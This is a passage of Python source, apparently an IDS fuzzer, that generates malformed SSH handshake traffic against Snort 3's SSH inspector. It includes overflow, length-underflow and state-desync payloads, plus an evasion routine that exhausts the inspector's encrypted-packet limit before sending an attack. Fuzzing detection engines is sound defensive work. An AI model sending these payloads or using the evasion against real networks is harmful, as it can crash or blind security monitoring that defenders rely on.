import struct
import random
from protocol.dynamic_data import get_commands, random_buffer_size, has_dynamic_data

# ---------------------------------------------------------------------------
# SSH mutation strategies for Snort 3's `ssh` service inspector (gid 135).
#
# Design (grounded in RFC 4251/4252/4253/4254 + the Snort SSH inspector):
#
# Snort's SSH inspector is a STATEFUL service inspector that only sees the
# UNENCRYPTED portion of an SSH session — the protocol-version exchange, the
# binary packet protocol, and the key exchange (KEXINIT / KEXDH / NEWKEYS).
# Once NEWKEYS is seen (or `max_encrypted_packets` encrypted packets go by)
# it marks the session encrypted and STOPS deep inspection. The classic
# detections it implements (and the surfaces we attack here):
#
#   * max_client_bytes (default 19600): if the client sends more than this many
#     bytes BEFORE the key exchange completes, it flags the SSH1/SSH2
#     Challenge-Response buffer overflow (CVE-2002-1357) — gid 135:1
#     SSH_EVENT_RESPOVERFLOW.
#   * SSH1 CRC32 compensation-attack detector (CVE-2001-0144) — 135:2
#     SSH_EVENT_CRC32.
#   * Server/version-string length overflow (SecureCRT) — 135:3
#     SSH_EVENT_SECURECRT, and version-string parse failure — 135:7
#     SSH_EVENT_VERSION.
#   * Protocol mismatch (SSH1 where SSH2 expected, bad protoversion) — 135:4
#     SSH_EVENT_PROTOMISMATCH.
#   * Messages travelling in the wrong direction (e.g. a server-only KEXDH_REPLY
#     coming from the client) — 135:5 SSH_EVENT_WRONGDIR.
#   * Binary-packet length/padding fields that don't add up (the
#     payload_len = packet_length - padding_length - 1 underflow) — 135:6
#     SSH_EVENT_PAYLOAD_SIZE.
#   * max_encrypted_packets (default 25): the inspector stops after this many
#     encrypted packets — an EVASION surface (make it give up, then attack).
#
# Every payload begins with a structurally VALID SSH identification banner
# ("SSH-2.0-...\r\n") UNLESS the strategy is specifically fuzzing the banner —
# so Snort's binder classifies the stream as SSH and engages the inspector
# BEFORE it reaches the malicious bytes (the same "warm up the inspector"
# approach used by protocol/smtp.py and protocol/ftp.py).
#
# All strategies are client->server and are delivered with
# StreamTransport.wrap_tcp_session (pipe mode) or LiveNetworkTransport.send_tcp
# to port 22 (live mode).
# ---------------------------------------------------------------------------

SSH_STRATEGIES = [
    "version_overflow",
    "version_confusion",
    "banner_flood",
    "packet_length_attack",
    "padding_corruption",
    "kexinit_namelist_overflow",
    "challenge_response_overflow",
    "crc32_attack",
    "kexdh_mpint_overflow",
    "state_machine_desync",
    "encrypted_packet_evasion",
    "disconnect_desync",
    "guess_kex_confusion",
    "gex_group_attack",
    "kexinit_empty_algorithm",
]

# Base weights (raw; normalised downstream). The signature SSH attacks
# (challenge-response overflow, binary-packet length underflow, CRC32) and the
# deepest parsers (KEXINIT name-lists, version string, mpint) get the most
# mass; legacy/edge strategies get less.
SSH_WEIGHTS = [10, 6, 5, 14, 8, 10, 14, 12, 8, 6, 6, 5, 4, 4, 11]

SSH_STRATEGY_LABELS = {
    "version_overflow":            "Version String Overflow",
    "version_confusion":           "Protocol Version Confusion",
    "banner_flood":                "Pre-Version Banner Flood",
    "packet_length_attack":        "Packet Length Field Attack",
    "padding_corruption":          "Padding Length Corruption",
    "kexinit_namelist_overflow":   "KEXINIT Name-List Overflow",
    "challenge_response_overflow": "Challenge-Response Overflow",
    "crc32_attack":                "SSH1 CRC32 Attack",
    "kexdh_mpint_overflow":        "KEXDH mpint Overflow",
    "state_machine_desync":        "KEX State Machine Desync",
    "encrypted_packet_evasion":    "Encrypted-Packet Evasion",
    "disconnect_desync":           "Disconnect/Ignore Desync",
    "guess_kex_confusion":         "KEX Guess Confusion",
    "gex_group_attack":            "GEX Group Exchange Attack",
    "kexinit_empty_algorithm":     "KEXINIT Empty Algorithm (CSCwu90036)",
}


# --- SSH message numbers (RFC 4253 §12, RFC 4419) --------------------------
_MSG_DISCONNECT = 1
_MSG_IGNORE = 2
_MSG_UNIMPLEMENTED = 3
_MSG_DEBUG = 4
_MSG_SERVICE_REQUEST = 5
_MSG_SERVICE_ACCEPT = 6
_MSG_KEXINIT = 20
_MSG_NEWKEYS = 21
_MSG_KEXDH_INIT = 30
_MSG_KEXDH_REPLY = 31
# Group exchange (RFC 4419) reuses 30-34 in the kex-specific range
_MSG_KEX_DH_GEX_REQUEST_OLD = 30
_MSG_KEX_DH_GEX_GROUP = 31
_MSG_KEX_DH_GEX_INIT = 32
_MSG_KEX_DH_GEX_REPLY = 33
_MSG_KEX_DH_GEX_REQUEST = 34

# A valid SSH-2.0 identification banner so Snort fingerprints the stream as SSH
# and engages the inspector before the malicious payload.
_VERSION = b"SSH-2.0-OpenSSH_8.9p1\r\n"

# Transport clamps a single TCP segment to 60000 bytes; keep big payloads under.
_MAX_SEG = 58000


# --- low-level encoders (RFC 4251 §5) --------------------------------------
def _u32(n: int) -> bytes:
    return struct.pack("!I", n & 0xFFFFFFFF)


def _string(b: bytes) -> bytes:
    """SSH 'string': uint32 length + raw bytes."""
    return _u32(len(b)) + b


def _namelist(names) -> bytes:
    """SSH 'name-list': uint32 length + comma-separated US-ASCII names."""
    joined = b",".join(names)
    return _u32(len(joined)) + joined


def _mpint(value: int) -> bytes:
    """SSH 'mpint': two's-complement big-endian, stored as a string."""
    if value == 0:
        return _u32(0)
    nbytes = (value.bit_length() + 8) // 8  # +1 so a leading 0 keeps it positive
    raw = value.to_bytes(nbytes, "big")
    return _string(raw)


def _ssh_packet(payload: bytes, pad_len: int = None) -> bytes:
    """Build a WELL-FORMED SSH binary packet (pre-encryption: no MAC, no
    compression). Layout (RFC 4253 §6):
        uint32 packet_length  (= 1 + len(payload) + padding)
        byte   padding_length
        byte[] payload
        byte[] random padding
    Total (4 + 1 + payload + padding) must be a multiple of 8, padding >= 4.
    """
    block = 8
    if pad_len is None:
        unpadded = 1 + len(payload)           # padding_length byte + payload
        pad_len = block - ((4 + unpadded) % block)
        if pad_len < 4:
            pad_len += block
    packet_length = 1 + len(payload) + pad_len
    return _u32(packet_length) + bytes([pad_len & 0xFF]) + payload + (b"\x00" * pad_len)


def _raw_packet(packet_length: int, pad_len: int, payload: bytes,
                padding: bytes = b"") -> bytes:
    """Build a packet with EXPLICITLY controlled (possibly invalid) length /
    padding fields, for length/padding torture tests."""
    return _u32(packet_length) + bytes([pad_len & 0xFF]) + payload + padding


def _kexinit(kex=None, hostkey=None, enc=None, mac=None, comp=None,
             lang=None, cookie: bytes = None, first_kex_follows: int = 0,
             reserved: int = 0) -> bytes:
    """Build a SSH_MSG_KEXINIT payload (RFC 4253 §7.1)."""
    if cookie is None:
        cookie = bytes(random.choices(range(256), k=16))
    kex = kex if kex is not None else [b"diffie-hellman-group14-sha1",
                                       b"diffie-hellman-group1-sha1"]
    hostkey = hostkey if hostkey is not None else [b"ssh-rsa", b"ssh-dss"]
    enc = enc if enc is not None else [b"aes128-ctr", b"aes256-ctr", b"3des-cbc"]
    mac = mac if mac is not None else [b"hmac-sha2-256", b"hmac-sha1"]
    comp = comp if comp is not None else [b"none", b"zlib"]
    lang = lang if lang is not None else []
    body = bytes([_MSG_KEXINIT]) + cookie[:16].ljust(16, b"\x00")
    body += _namelist(kex)
    body += _namelist(hostkey)
    body += _namelist(enc)    # encryption c2s
    body += _namelist(enc)    # encryption s2c
    body += _namelist(mac)    # mac c2s
    body += _namelist(mac)    # mac s2c
    body += _namelist(comp)   # compression c2s
    body += _namelist(comp)   # compression s2c
    body += _namelist(lang)   # languages c2s
    body += _namelist(lang)   # languages s2c
    body += bytes([first_kex_follows & 0x01])
    body += _u32(reserved)
    return body


def _ssh1_packet(msg_type: int, data: bytes, force_len: int = None) -> bytes:
    """Build an SSH1 (protocol 1.x) binary packet (the CRC32-attack surface).
    SSH1 layout:
        uint32 length        (= len(type+data+crc) ; padding NOT counted)
        byte[] padding        (8 - (length % 8) bytes)
        byte   type
        byte[] data
        uint32 crc32
    The padding is what the CRC32 'deattack' detector scans for repeated blocks.
    """
    body = bytes([msg_type]) + data + _u32(0)  # type + data + (dummy) crc
    length = len(body) if force_len is None else force_len
    pad = 8 - (length % 8)
    padding = b"\x00" * pad
    return _u32(length) + padding + body


def build_ssh_payload(strategy: str, payload_override=None) -> bytes:
    """Build one SSH payload (client->server bytes) for the given strategy."""

    if strategy == "version_overflow":
        # SSH identification-string parsing abuse (RFC 4253 §4.2: max 255 chars
        # incl. CR LF; no NUL). Targets the version-string buffer
        # (max_server_version_len) and version detection — 135:3 SECURECRT /
        # 135:7 VERSION.
        variant = random.choice([
            "giant_software", "giant_comment", "no_crlf", "null_embedded",
            "bare_lf", "no_terminator_then_kex", "many_dashes",
        ])
        if variant == "giant_software":
            return b"SSH-2.0-" + (b"A" * _MAX_SEG) + b"\r\n"
        elif variant == "giant_comment":
            return b"SSH-2.0-OpenSSH_8.9 " + (b"C" * _MAX_SEG) + b"\r\n"
        elif variant == "no_crlf":
            # Version line with no terminator at all — inspector buffers forever.
            return b"SSH-2.0-" + (b"X" * 40000)
        elif variant == "null_embedded":
            return b"SSH-2.0-Open\x00SSH_" + (b"\x00" * 4000) + b"\r\n"
        elif variant == "bare_lf":
            # LF-only termination (no CR) — line-ending parse divergence.
            return b"SSH-2.0-OpenSSH_8.9p1\n"
        elif variant == "many_dashes":
            # protoversion / softwareversion split confusion (extra '-').
            return b"SSH-2.0-" + (b"a-" * 20000) + b"\r\n"
        else:  # no_terminator_then_kex
            return b"SSH-2.0-" + (b"V" * 30000) + _ssh_packet(_kexinit())

    elif strategy == "version_confusion":
        # Protocol version mismatch / downgrade (RFC 4253 §5) — 135:4
        # PROTOMISMATCH and the SSH1<->SSH2 state machine.
        variant = random.choice([
            "ssh1_banner_ssh2_body", "compat_199", "bad_protover",
            "no_ssh_prefix", "ssh2_then_ssh1_pkt", "double_version",
            "ssh1_only",
        ])
        if variant == "ssh1_banner_ssh2_body":
            # Claims SSH-1.5 but sends an SSH2 KEXINIT.
            return b"SSH-1.5-OpenSSH_8.9\r\n" + _ssh_packet(_kexinit())
        elif variant == "compat_199":
            # "1.99" = server speaks both; client confuses the version tracker.
            return b"SSH-1.99-OpenSSH_8.9\r\n" + _ssh_packet(_kexinit())
        elif variant == "bad_protover":
            bad = random.choice([b"SSH-9.9-x\r\n", b"SSH-2-x\r\n",
                                 b"SSH-.-x\r\n", b"SSH-2.0.0-x\r\n",
                                 b"SSH-02.00-x\r\n", b"SSH--\r\n"])
            return bad + _ssh_packet(_kexinit())
        elif variant == "no_ssh_prefix":
            # Missing the "SSH-" magic — version detection must fail/recover.
            return b"NOTSSH-2.0-evil\r\n" + _ssh_packet(_kexinit())
        elif variant == "ssh2_then_ssh1_pkt":
            return _VERSION + _ssh1_packet(3, b"D" * 200)
        elif variant == "double_version":
            return b"SSH-2.0-First\r\nSSH-2.0-Second\r\n" + _ssh_packet(_kexinit())
        else:  # ssh1_only
            return b"SSH-1.5-OpenSSH_8.9\r\n" + _ssh1_packet(2, b"S" * 500)

    elif strategy == "banner_flood":
        # The server MAY emit lines before the version string (RFC 4253 §4.2:
        # TCP-wrapper messages); these MUST NOT begin with "SSH-". We abuse that
        # pre-version line handling and its buffering.
        variant = random.choice([
            "many_lines", "giant_preline", "unterminated", "ssh_prefixed",
            "cr_only_lines", "null_lines",
        ])
        if variant == "many_lines":
            lines = b"".join(b"Welcome to the jungle line %d\r\n" % i
                             for i in range(3000))
            return lines + _VERSION
        elif variant == "giant_preline":
            return (b"X" * _MAX_SEG) + b"\r\n" + _VERSION
        elif variant == "unterminated":
            # Pre-version data, no CRLF, no "SSH-": inspector keeps waiting.
            return b"banner-with-no-end " + (b"Z" * 40000)
        elif variant == "ssh_prefixed":
            # Illegal: pre-version lines starting with the reserved "SSH-".
            return (b"SSH-banner-line-1\r\nSSH-banner-line-2\r\n" * 2000) + _VERSION
        elif variant == "cr_only_lines":
            return (b"line terminated by bare CR\r" * 3000) + _VERSION
        else:  # null_lines
            return (b"\x00\x00banner\x00\r\n" * 4000) + _VERSION

    elif strategy == "packet_length_attack":
        # Binary-packet 'packet_length' (uint32) field torture (RFC 4253 §6) —
        # the payload_len = packet_length - padding_length - 1 computation is the
        # classic underflow → huge memcpy. 135:6 PAYLOAD_SIZE.
        variant = random.choice([
            "max_length", "zero_length", "length_one", "huge_realistic",
            "underflow_vs_padding", "giant_valid", "length_mismatch_short",
        ])
        if variant == "max_length":
            # packet_length=0xFFFFFFFF, only a few real bytes follow.
            return _VERSION + _raw_packet(0xFFFFFFFF, 4, b"\x14" + b"A" * 8)
        elif variant == "zero_length":
            return _VERSION + _raw_packet(0, 0, b"")
        elif variant == "length_one":
            # packet_length=1 with padding_length=4 → 1-4-1 underflows.
            return _VERSION + _raw_packet(1, 4, b"")
        elif variant == "huge_realistic":
            # Declares ~16 MB, sends little.
            return _VERSION + _raw_packet(0x00FFFFFF, 6, b"\x14" + b"B" * 32)
        elif variant == "underflow_vs_padding":
            # packet_length=5 but padding_length=200 → payload_len underflow.
            return _VERSION + _raw_packet(5, 200, b"\x14\x00\x00")
        elif variant == "length_mismatch_short":
            # Says 50000 bytes follow, sends only 100.
            return _VERSION + _raw_packet(50000, 8, b"\x14" + b"C" * 100)
        else:  # giant_valid — a genuinely huge but WELL-FORMED packet
            return _VERSION + _ssh_packet(bytes([_MSG_IGNORE]) +
                                          _string(b"G" * (_MAX_SEG - 100)))

    elif strategy == "padding_corruption":
        # 'padding_length' field abuse (RFC 4253 §6: MUST be 4..255 and total a
        # multiple of the block size). 135:6 PAYLOAD_SIZE.
        variant = random.choice([
            "pad_zero", "pad_below_min", "pad_max", "pad_exceeds_packet",
            "pad_equals_length", "not_block_multiple",
        ])
        kex = _kexinit()
        if variant == "pad_zero":
            # padding_length=0 (illegal, min is 4).
            return _VERSION + _raw_packet(1 + len(kex), 0, kex)
        elif variant == "pad_below_min":
            pad = random.choice([1, 2, 3])
            return _VERSION + _raw_packet(1 + len(kex) + pad, pad, kex,
                                          b"\x00" * pad)
        elif variant == "pad_max":
            # padding_length=255 but packet_length says otherwise (mismatch).
            return _VERSION + _raw_packet(10, 255, kex[:8])
        elif variant == "pad_exceeds_packet":
            # padding_length far larger than the whole declared packet.
            return _VERSION + _raw_packet(20, 250, kex[:15])
        elif variant == "pad_equals_length":
            # padding_length == packet_length → payload_len = -1.
            return _VERSION + _raw_packet(64, 64, b"\x14" + b"\x00" * 30)
        else:  # not_block_multiple — total length not a multiple of 8
            return _VERSION + _raw_packet(1 + len(kex) + 5, 5, kex, b"\x00" * 5)

    elif strategy == "kexinit_namelist_overflow":
        # KEXINIT name-list (uint32 length-prefixed) parser abuse (RFC 4253 §7.1).
        variant = random.choice([
            "namelist_huge_len", "namelist_count_flood", "namelist_giant_name",
            "all_zero_lists", "past_boundary", "embedded_garbage",
            "many_namelists_overflow",
        ])
        if variant == "namelist_huge_len":
            # First name-list claims length 0xFFFFFFFF, has few bytes — OOB read.
            cookie = bytes(random.choices(range(256), k=16))
            body = bytes([_MSG_KEXINIT]) + cookie
            body += _u32(0xFFFFFFFF) + b"diffie-hellman-group14-sha1"
            return _VERSION + _raw_packet(1 + len(body) + 6, 6, body, b"\x00" * 6)
        elif variant == "namelist_count_flood":
            # Thousands of algorithm names in kex_algorithms.
            names = [b"kex-%d-method@fuzz.example.com" % i for i in range(3000)]
            return _VERSION + _ssh_packet(_kexinit(kex=names))
        elif variant == "namelist_giant_name":
            return _VERSION + _ssh_packet(_kexinit(kex=[b"A" * (_MAX_SEG - 200)]))
        elif variant == "all_zero_lists":
            # Every one of the 10 name-lists is zero-length.
            return _VERSION + _ssh_packet(_kexinit(
                kex=[], hostkey=[], enc=[], mac=[], comp=[], lang=[]))
        elif variant == "past_boundary":
            # Name-list length pushes beyond the declared packet_length.
            cookie = bytes(random.choices(range(256), k=16))
            body = bytes([_MSG_KEXINIT]) + cookie + _u32(50000) + (b"x" * 100)
            return _VERSION + _raw_packet(40, 4, body, b"\x00" * 4)
        elif variant == "embedded_garbage":
            # Names with embedded NUL / comma / control chars.
            bad = [b"aes128\x00ctr", b"hmac,sha1", b"none\xff\xfe", b"\x01\x02\x03"]
            return _VERSION + _ssh_packet(_kexinit(enc=bad, mac=bad))
        else:  # many_namelists_overflow — every list is a count flood
            big = [b"m-%d" % i for i in range(800)]
            return _VERSION + _ssh_packet(_kexinit(
                kex=big, hostkey=big, enc=big, mac=big, comp=big, lang=big))

    elif strategy == "challenge_response_overflow":
        # CVE-2002-1357 Challenge-Response Buffer Overflow — Snort flags it when
        # the client sends > max_client_bytes (default 19600) BEFORE the key
        # exchange completes. 135:1 SSH_EVENT_RESPOVERFLOW.
        variant = random.choice([
            "single_giant", "many_packets", "giant_kexdh", "slow_drip",
            "kexinit_then_flood",
        ])
        if variant == "single_giant":
            # One pre-KEX packet far larger than max_client_bytes.
            return _VERSION + _ssh_packet(bytes([_MSG_IGNORE]) +
                                          _string(b"R" * (_MAX_SEG - 100)))
        elif variant == "many_packets":
            # Many medium IGNORE packets totalling > 19600, never sending NEWKEYS.
            out = [_VERSION, _ssh_packet(_kexinit())]
            for i in range(40):
                out.append(_ssh_packet(bytes([_MSG_IGNORE]) + _string(b"D" * 1000)))
            return b"".join(out)
        elif variant == "giant_kexdh":
            # KEXDH_INIT carrying an mpint 'e' that alone exceeds max_client_bytes.
            e = _string(b"\x7f" + b"\xff" * (_MAX_SEG - 200))
            return _VERSION + _ssh_packet(bytes([_MSG_KEXDH_INIT]) + e)
        elif variant == "slow_drip":
            # Lots of tiny IGNORE packets accumulating past the limit pre-KEX.
            out = [_VERSION]
            for i in range(2500):
                out.append(_ssh_packet(bytes([_MSG_IGNORE]) + _string(b"x" * 8)))
            return b"".join(out)
        else:  # kexinit_then_flood
            return (_VERSION + _ssh_packet(_kexinit()) +
                    _ssh_packet(bytes([_MSG_KEXDH_INIT]) +
                                _string(b"K" * (_MAX_SEG - 200))))

    elif strategy == "crc32_attack":
        # CVE-2001-0144 SSH1 CRC32 compensation-attack — the 'deattack' detector
        # scans SSH1 packet padding for many identical blocks. 135:2 CRC32.
        variant = random.choice([
            "ssh1_giant_packet", "repeated_blocks", "ssh1_long_length",
            "ssh1_session_key", "ssh1_zero_blocks",
        ])
        v1 = b"SSH-1.5-OpenSSH_8.9\r\n"
        if variant == "ssh1_giant_packet":
            return v1 + _ssh1_packet(3, b"A" * (_MAX_SEG - 100))
        elif variant == "repeated_blocks":
            # Many identical 8-byte blocks — the classic deattack trigger.
            block = b"\xff\xff\xff\xff\xff\xff\xff\xff"
            return v1 + _ssh1_packet(3, block * 4000)
        elif variant == "ssh1_long_length":
            # Oversized SSH1 length field with little data.
            return v1 + _raw_packet(0x0000FFFF, 0, b"\x03" + b"B" * 32)
        elif variant == "ssh1_session_key":
            # SSH_CMSG_SESSION_KEY (3) with a malformed huge mpint-ish blob.
            return v1 + _ssh1_packet(3, _string(b"\x80" + b"\x00" * 4000))
        else:  # ssh1_zero_blocks — repeated all-zero blocks (deattack heuristic)
            return v1 + _ssh1_packet(3, (b"\x00" * 8) * 4000)

    elif strategy == "kexdh_mpint_overflow":
        # KEXDH_INIT/REPLY mpint & string length parsing (RFC 4253 §8). The
        # bignum 'e'/'f' and the host-key/signature strings are length-prefixed.
        variant = random.choice([
            "huge_mpint_len", "negative_mpint", "zero_mpint", "leading_zeros",
            "reply_wrongdir", "hostkey_giant", "mpint_past_boundary",
        ])
        if variant == "huge_mpint_len":
            # mpint declares length 0xFFFFFFFF, has few bytes — OOB read.
            body = bytes([_MSG_KEXDH_INIT]) + _u32(0xFFFFFFFF) + b"\x01\x02\x03"
            return _VERSION + _raw_packet(1 + len(body) + 5, 5, body, b"\x00" * 5)
        elif variant == "negative_mpint":
            # High bit set on first byte → negative bignum (RFC 4251 §5).
            e = _string(b"\xff" + bytes(random.choices(range(256), k=255)))
            return _VERSION + _ssh_packet(bytes([_MSG_KEXDH_INIT]) + e)
        elif variant == "zero_mpint":
            return _VERSION + _ssh_packet(bytes([_MSG_KEXDH_INIT]) + _u32(0))
        elif variant == "leading_zeros":
            # Unnecessary leading zero bytes (RFC 4251 forbids; parser stress).
            e = _string(b"\x00" * 2000 + b"\x01")
            return _VERSION + _ssh_packet(bytes([_MSG_KEXDH_INIT]) + e)
        elif variant == "reply_wrongdir":
            # KEXDH_REPLY (31) is SERVER->CLIENT; sending it from the client is
            # the wrong direction — 135:5 WRONGDIR — plus giant host-key string.
            body = (bytes([_MSG_KEXDH_REPLY]) +
                    _string(b"ssh-rsa" + b"\x00" * 30000) +   # K_S
                    _string(b"\x7f" + b"\xff" * 2000) +        # f
                    _string(b"sig" + b"\x00" * 20000))         # signature
            return _VERSION + _ssh_packet(body[:_MAX_SEG])
        elif variant == "hostkey_giant":
            body = bytes([_MSG_KEXDH_REPLY]) + _string(b"K" * (_MAX_SEG - 100))
            return _VERSION + _ssh_packet(body)
        else:  # mpint_past_boundary
            body = bytes([_MSG_KEXDH_INIT]) + _u32(40000) + (b"e" * 50)
            return _VERSION + _raw_packet(30, 4, body, b"\x00" * 4)

    elif strategy == "state_machine_desync":
        # Out-of-order / wrong-direction key-exchange messages (RFC 4253 §7) —
        # tests the inspector's KEX state tracking. 135:5 WRONGDIR / 135:6.
        variant = random.choice([
            "kexdh_before_kexinit", "premature_newkeys", "double_kexinit",
            "service_before_newkeys", "server_msg_from_client",
            "newkeys_then_cleartext", "kexinit_storm",
        ])
        if variant == "kexdh_before_kexinit":
            # KEXDH_INIT with no preceding KEXINIT.
            return _VERSION + _ssh_packet(bytes([_MSG_KEXDH_INIT]) +
                                          _mpint(random.getrandbits(1024)))
        elif variant == "premature_newkeys":
            # NEWKEYS before any key exchange happened.
            return _VERSION + _ssh_packet(bytes([_MSG_NEWKEYS]))
        elif variant == "double_kexinit":
            return _VERSION + _ssh_packet(_kexinit()) * 3
        elif variant == "service_before_newkeys":
            # SERVICE_REQUEST before NEWKEYS (must be encrypted).
            return (_VERSION + _ssh_packet(_kexinit()) +
                    _ssh_packet(bytes([_MSG_SERVICE_REQUEST]) +
                                _string(b"ssh-userauth")))
        elif variant == "server_msg_from_client":
            # SERVICE_ACCEPT (6) is server-only — wrong direction.
            return _VERSION + _ssh_packet(bytes([_MSG_SERVICE_ACCEPT]) +
                                          _string(b"ssh-userauth"))
        elif variant == "newkeys_then_cleartext":
            # Claim encryption started (NEWKEYS) then keep sending cleartext KEX.
            return (_VERSION + _ssh_packet(_kexinit()) +
                    _ssh_packet(bytes([_MSG_NEWKEYS])) +
                    _ssh_packet(_kexinit()))
        else:  # kexinit_storm
            return _VERSION + b"".join(_ssh_packet(_kexinit()) for _ in range(200))

    elif strategy == "encrypted_packet_evasion":
        # max_encrypted_packets (default 25): the inspector STOPS deep inspection
        # after this many encrypted packets. Complete a (fake) KEX, push past the
        # threshold, then send an attack that should now be missed — evasion.
        prelude = (_VERSION + _ssh_packet(_kexinit()) +
                   _ssh_packet(bytes([_MSG_KEXDH_INIT]) +
                               _mpint(random.getrandbits(1024))) +
                   _ssh_packet(bytes([_MSG_NEWKEYS])))
        if payload_override is not None:
            out = [prelude]
            for _ in range(40):
                out.append(_ssh_packet(bytes(random.choices(range(256), k=64))))
            out.append(_ssh_packet(payload_override))
            return b"".join(out)
        variant = random.choice([
            "fake_kex_then_attack", "rapid_newkeys", "post_enc_overflow",
            "many_small_encrypted",
        ])
        if variant == "fake_kex_then_attack":
            # 40 "encrypted" packets (> max_encrypted_packets) then an overflow.
            out = [prelude]
            for _ in range(40):
                out.append(_ssh_packet(bytes(random.choices(range(256), k=64))))
            out.append(_raw_packet(0xFFFFFFFF, 4, b"\x14" + b"A" * 16))
            return b"".join(out)
        elif variant == "rapid_newkeys":
            return _VERSION + b"".join(_ssh_packet(bytes([_MSG_NEWKEYS]))
                                       for _ in range(100))
        elif variant == "post_enc_overflow":
            return prelude + _raw_packet(0x00FFFFFF, 6, b"\xff" + b"B" * 32)
        else:  # many_small_encrypted
            out = [prelude]
            for _ in range(60):
                out.append(_ssh_packet(bytes(random.choices(range(256), k=16))))
            return b"".join(out)

    elif strategy == "disconnect_desync":
        # Transport-layer message abuse (RFC 4253 §11): DISCONNECT / IGNORE /
        # DEBUG / UNIMPLEMENTED — and data after a DISCONNECT.
        variant = random.choice([
            "data_after_disconnect", "ignore_flood", "debug_overflow",
            "unimplemented_flood", "disconnect_bad_reason", "debug_display_flood",
        ])
        if variant == "data_after_disconnect":
            return (_VERSION + _ssh_packet(_kexinit()) +
                    _ssh_packet(bytes([_MSG_DISCONNECT]) + _u32(11) +
                                _string(b"bye") + _string(b"")) +
                    _ssh_packet(_kexinit()) +
                    _ssh_packet(bytes([_MSG_KEXDH_INIT]) + _mpint(12345)))
        elif variant == "ignore_flood":
            out = [_VERSION]
            for _ in range(1500):
                out.append(_ssh_packet(bytes([_MSG_IGNORE]) + _string(b"i" * 16)))
            return b"".join(out)
        elif variant == "debug_overflow":
            # DEBUG (4): always_display bool + huge UTF-8 message + lang.
            body = (bytes([_MSG_DEBUG]) + b"\x01" +
                    _string(b"D" * (_MAX_SEG - 200)) + _string(b"en"))
            return _VERSION + _ssh_packet(body)
        elif variant == "unimplemented_flood":
            out = [_VERSION]
            for i in range(2000):
                out.append(_ssh_packet(bytes([_MSG_UNIMPLEMENTED]) + _u32(i)))
            return b"".join(out)
        elif variant == "disconnect_bad_reason":
            # reason code 0xFFFFFFFF + oversized description.
            body = (bytes([_MSG_DISCONNECT]) + _u32(0xFFFFFFFF) +
                    _string(b"E" * 40000) + _string(b"xx"))
            return _VERSION + _ssh_packet(body)
        else:  # debug_display_flood — many always_display DEBUG msgs
            out = [_VERSION]
            for _ in range(800):
                out.append(_ssh_packet(bytes([_MSG_DEBUG]) + b"\x01" +
                                       _string(b"\x1b[2J\x07msg") + _string(b"")))
            return b"".join(out)

    elif strategy == "guess_kex_confusion":
        # KEX guessing (RFC 4253 §7.1): first_kex_packet_follows + the trailing
        # reserved uint32 + the random cookie. Tests the "ignore the wrongly
        # guessed packet" branch and cookie/reserved validation.
        variant = random.choice([
            "wrong_guess", "all_zero_cookie", "all_ff_cookie",
            "reserved_nonzero", "multiple_guessed", "guess_giant",
        ])
        if variant == "wrong_guess":
            # first_kex_packet_follows=1 then a "guessed" packet that won't match.
            return (_VERSION + _ssh_packet(_kexinit(first_kex_follows=1)) +
                    _ssh_packet(bytes([_MSG_KEXDH_INIT]) + _mpint(99)))
        elif variant == "all_zero_cookie":
            return _VERSION + _ssh_packet(_kexinit(cookie=b"\x00" * 16))
        elif variant == "all_ff_cookie":
            return _VERSION + _ssh_packet(_kexinit(cookie=b"\xff" * 16))
        elif variant == "reserved_nonzero":
            # Trailing reserved field MUST be 0; set it to 0xFFFFFFFF.
            return _VERSION + _ssh_packet(_kexinit(reserved=0xFFFFFFFF))
        elif variant == "multiple_guessed":
            out = [_VERSION, _ssh_packet(_kexinit(first_kex_follows=1))]
            for _ in range(50):
                out.append(_ssh_packet(bytes([_MSG_KEXDH_INIT]) + _mpint(random.getrandbits(512))))
            return b"".join(out)
        else:  # guess_giant — guessed packet with an oversized mpint
            return (_VERSION + _ssh_packet(_kexinit(first_kex_follows=1)) +
                    _ssh_packet(bytes([_MSG_KEXDH_INIT]) +
                                _string(b"\x7f" + b"\xff" * (_MAX_SEG - 200))))

    elif strategy == "gex_group_attack":
        # Diffie-Hellman Group Exchange (RFC 4419): GEX_REQUEST carries min/n/max
        # uint32 preferences; GEX_GROUP carries p/g mpints; GEX_INIT carries e.
        # Targets the GEX integer/bignum parser, a distinct surface from the
        # fixed group1/group14 DH.
        variant = random.choice([
            "min_gt_max", "huge_n", "zero_all", "giant_p", "request_old_giant",
            "gex_init_overflow", "negative_g",
        ])
        # Negotiate group-exchange first so the inspector is in the GEX branch.
        gex_kexinit = _ssh_packet(_kexinit(
            kex=[b"diffie-hellman-group-exchange-sha256",
                 b"diffie-hellman-group-exchange-sha1"]))
        if variant == "min_gt_max":
            # min=8192, n=4096, max=1024  → min > max (RFC 4419 violation).
            body = bytes([_MSG_KEX_DH_GEX_REQUEST]) + _u32(8192) + _u32(4096) + _u32(1024)
            return _VERSION + gex_kexinit + _ssh_packet(body)
        elif variant == "huge_n":
            body = bytes([_MSG_KEX_DH_GEX_REQUEST]) + _u32(0xFFFFFFFF) + _u32(0xFFFFFFFF) + _u32(0xFFFFFFFF)
            return _VERSION + gex_kexinit + _ssh_packet(body)
        elif variant == "zero_all":
            body = bytes([_MSG_KEX_DH_GEX_REQUEST]) + _u32(0) + _u32(0) + _u32(0)
            return _VERSION + gex_kexinit + _ssh_packet(body)
        elif variant == "giant_p":
            # GEX_GROUP (31) with an oversized prime p (server msg from client too).
            body = (bytes([_MSG_KEX_DH_GEX_GROUP]) +
                    _string(b"\x7f" + b"\xff" * (_MAX_SEG - 300)) +  # p
                    _mpint(2))                                       # g
            return _VERSION + gex_kexinit + _ssh_packet(body[:_MAX_SEG])
        elif variant == "request_old_giant":
            # Old-style GEX_REQUEST_OLD (30): single uint32 'n' at the max.
            body = bytes([_MSG_KEX_DH_GEX_REQUEST_OLD]) + _u32(0xFFFFFFFF)
            return _VERSION + gex_kexinit + _ssh_packet(body)
        elif variant == "gex_init_overflow":
            # GEX_INIT (32) with an oversized 'e'.
            body = bytes([_MSG_KEX_DH_GEX_INIT]) + _string(b"\x7f" + b"\xff" * (_MAX_SEG - 200))
            return _VERSION + gex_kexinit + _ssh_packet(body)
        else:  # negative_g — GEX_GROUP with a negative generator mpint
            body = (bytes([_MSG_KEX_DH_GEX_GROUP]) +
                    _string(b"\x80\x01") +              # negative p
                    _string(b"\xff\xff"))               # negative g
            return _VERSION + gex_kexinit + _ssh_packet(body)

    elif strategy == "kexinit_empty_algorithm":
        # CSCwu90036: Send KEXINIT with zero-length algorithm name-lists.
        # Snort's SSH inspector parses the 10 name-list fields in KEXINIT;
        # empty lists may cause underflow, null-deref, or parser confusion
        # when the inspector tries to match algorithms.
